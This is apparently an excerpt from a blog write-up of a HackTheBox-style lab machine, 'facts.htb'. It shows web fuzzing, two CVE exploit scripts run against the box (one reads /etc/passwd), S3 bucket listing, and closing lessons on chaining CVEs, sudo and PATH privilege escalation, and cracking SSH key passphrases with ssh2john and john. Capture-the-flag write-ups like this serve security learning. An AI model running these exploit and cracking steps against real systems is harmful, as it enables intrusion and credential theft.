...
<Block
  language="Bash"
  content="ffuf -u http://facts.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt"
/>
...
<Block
  language="Bash"
  content={
    "python CVE-2025-2304.py http://facts.htb/admin/login -u user -p password"
  }
/>
...
<Bild
  src={
    "https://s8lcpnzirhyz4bbt.public.blob.vercel-storage.com/Blogs/facts-admin-dashboard.png"
  }
...
<Block
  language="Bash"
  content="aws --endpoint-url http://facts.htb:54321 s3 ls"
/>
...
<Block
  language="Bash"
  content={
    "python3 CVE-2024-46987.py -u http://facts.htb/ -l user -p password /etc/passwd"
  }
/>
...
This box was a good reminder that enumeration and chaining are everything. Nothing here was particularly hard in isolation, but connecting everything together was the key.

<br />

**Chain your exploits logically**: The CMS had two CVEs. One for privesc within the app, one for file read. Neither was useful alone. Using them in sequence is what unlocked the path forward. Sometimes one CVE just needs another CVE to be useful.

<br />

**<Code content="sudo -l" /> is always the first thing after getting a shell**: On this box it immediately handed the privesc vector. This needs to be muscle memory.

<br />

**Linpeas flags writable PATH abuses for a reason**: A 95% confidence flag is not noise. In this case it pointed directly to the <Code content="facter" /> binary and the actual root path.

<br />

**Passphrase-protected SSH keys are crackable**: <Code content="ssh2john" /> converts the key to a crackable hash, then john does the rest. That is absolutely huge.
